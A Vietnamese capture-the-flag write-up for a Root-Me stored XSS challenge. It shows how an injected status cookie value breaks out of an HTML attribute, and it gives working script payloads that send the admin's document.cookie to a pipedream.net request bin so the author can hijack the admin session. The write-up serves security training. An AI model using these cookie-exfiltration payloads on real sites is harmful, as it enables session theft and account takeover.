# WRITE UP

**Challenge:** [XSS – Stored 2](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-2)

Thử fuzz các payload ở tab Admin và Post nhưng không có gì xảy ra. Kiểm tra và test thử thì thấy điều đặc biệt là **Status: invite** ở mỗi post.

<img src="./media/image1.png" style="width:6.5in;height:3.01458in" alt="Graphical user interface, text, website Description automatically generated" />

Check cookie của website thì thấy nó được handle dựa trên cookie này:

<img src="./media/image2.png" style="width:6.5in;height:3.21806in" alt="Graphical user interface Description automatically generated with medium confidence" />

Bỏ vào repeater và check thử thì thấy nó work:

<img src="./media/image3.png" style="width:6.5in;height:3.32153in" alt="Graphical user interface, text, application, email Description automatically generated" />

Ở đây, class “nh4ttruong” sẽ là điểm đích ta tấn công. Thử nhét payload XSS vào thử:

**Payload:** hehe"&gt;&lt;script&gt;alert(1)&lt;/script**&gt;**

<img src="./media/image4.png" style="width:6.5in;height:1.6125in" alt="Graphical user interface, text, application Description automatically generated" />

<img src="./media/image5.png" style="width:6.5in;height:1.97153in" alt="Graphical user interface, application, Teams Description automatically generated" />

Từ đó, ta đã có chỗ để tiêm XSS vào rồi. Tương tự các bài stored, ta tạo request bin và bơm vào:

**Payload:** *"&gt;&lt;script&gt;document.write("&lt;img src=https://eol9dtzbk9673pb.m.pipedream.net?cookie=%22.concat(document.cookie).concat(%22/&gt;%22))&lt;/script&gt;*

Cookie trả về có vẻ vẫn chưa nhận được. Nhưng referer trả về ?admin=1&idx=0. Nói lên rằng nó đã đi đúng hướng và admin đã đọc được:

<img src="./media/image6.png" style="width:6.5in;height:2.94583in" alt="Graphical user interface, text, application Description automatically generated" />

Mở intercept kiểm tra source với payload tương tự thì phát hiện cookie=status=invite;” kết thúc bằng “ ”, do đó, rất có thể nó không link được đến cookie của admin

<img src="./media/image7.png" style="width:6.5in;height:2.06736in" alt="A screenshot of a computer Description automatically generated with medium confidence" />

Để giải quyết điều này, ta thử sử dụng hàm REPLACE để xóa bỏ “ ” và chèn vào ký tự “&” để link các cookie với nhau:

**Payload:** *"&gt;&lt;script&gt;document.write("&lt;img src=https://eol9dtzbk9673pb.m.pipedream.net?cookie=%22.concat(document.cookie.replace(%27 %27,%27&%27 ).concat(%22/&gt;%22))&lt;/script&gt;*

<img src="./media/image8.png" style="width:6.5in;height:2.50278in" alt="Graphical user interface, text, application Description automatically generated" />

Có **ADMIN\_COOKIE**, ta thay đổi vào cookie và get pass:

<img src="./media/image9.png" style="width:6.5in;height:3.91875in" alt="Graphical user interface, text, application, email Description automatically generated" />

<img src="./media/image10.png" style="width:6.5in;height:3.24167in" alt="A screenshot of a computer Description automatically generated with medium confidence" />

\- Flag: \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
